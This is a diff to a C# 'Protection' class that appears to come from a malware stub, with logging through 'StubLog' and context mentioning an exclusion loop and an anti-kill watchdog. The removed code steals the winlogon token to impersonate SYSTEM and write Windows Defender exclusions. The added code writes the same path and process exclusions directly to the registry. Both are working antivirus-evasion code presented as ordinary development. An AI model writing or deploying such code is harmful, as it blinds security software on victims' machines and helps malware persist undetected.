@@ -460,28 +460,7 @@ internal static partial class Protection
         catch { }
     }
 
-    // ── WMI Defender Exclusion (native, no PowerShell) ───────────────────────
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool OpenProcessToken(nint hProcess, uint dwDesiredAccess, out nint phToken);
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool DuplicateTokenEx(
-        nint hExistingToken, uint dwDesiredAccess, nint lpTokenAttributes,
-        int ImpersonationLevel, int TokenType, out nint phNewToken);
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool ImpersonateLoggedOnUser(nint hToken);
-
-    [DllImport("advapi32.dll", SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool RevertToSelf();
-
-    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
-    private static extern int RegSetKeyValueW(nint hKey, string lpSubKey, string lpValueName, uint dwType, ref int lpData, uint cbData);
+    // ── Defender Exclusion (Microsoft.Win32.Registry — safe, no P/Invoke) ───────
 
     private static volatile bool _exclusionLoopRunning;
 
@@ -512,50 +491,27 @@ internal static partial class Protection
         t.Start();
     }
 
-    // Writes a REG_DWORD=0 to HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\<subKey>\<value>
-    // as SYSTEM (steals winlogon token) — same effect as the WMI MSFT_MpPreference call.
-    private static void SetDefenderRegistryExclusion(string subKey, string value)
+    public static void AddDefenderExclusion(string path)
     {
-        nint hToken = 0, hDup = 0;
-        bool impersonated = false;
         try
         {
-            var wl = Process.GetProcessesByName("winlogon").FirstOrDefault();
-            if (wl != null)
-            {
-                nint hProc = OpenProcess(0x400, false, wl.Id);
-                if (hProc != 0)
-                {
-                    if (OpenProcessToken(hProc, 0x0002, out hToken))
-                    {
-                        DuplicateTokenEx(hToken, 0xF01FF, 0, 2, 2, out hDup);
-                        if (hDup != 0) impersonated = ImpersonateLoggedOnUser(hDup);
-                    }
-                    CloseHandle(hProc);
-                }
-            }
-            nint HKLM = unchecked((nint)0x80000002L);
-            int zero = 0;
-            RegSetKeyValueW(HKLM,
-                @"SOFTWARE\Microsoft\Windows Defender\Exclusions\" + subKey,
-                value, 4 /*REG_DWORD*/, ref zero, 4);
+            using var k = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(
+                @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths", writable: true);
+            k?.SetValue(path, 0, Microsoft.Win32.RegistryValueKind.DWord);
+            StubLog.Info($"[Defender] Exclusion added: {path}");
         }
         catch { }
-        finally
-        {
-            if (impersonated) RevertToSelf();
-            if (hDup != 0) CloseHandle(hDup);
-            if (hToken != 0) CloseHandle(hToken);
-        }
     }
 
     public static void AddDefenderProcessExclusion(string processName)
-        => SetDefenderRegistryExclusion("Processes", processName);
-
-    public static void AddDefenderExclusion(string path)
     {
-        SetDefenderRegistryExclusion("Paths", path);
-        StubLog.Info($"[Defender] Exclusion added: {path}");
+        try
+        {
+            using var k = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(
+                @"SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes", writable: true);
+            k?.SetValue(processName, 0, Microsoft.Win32.RegistryValueKind.DWord);
+        }
+        catch { }
     }
 
     // ── Anti-Kill Watchdog (usermode guardian process) ──
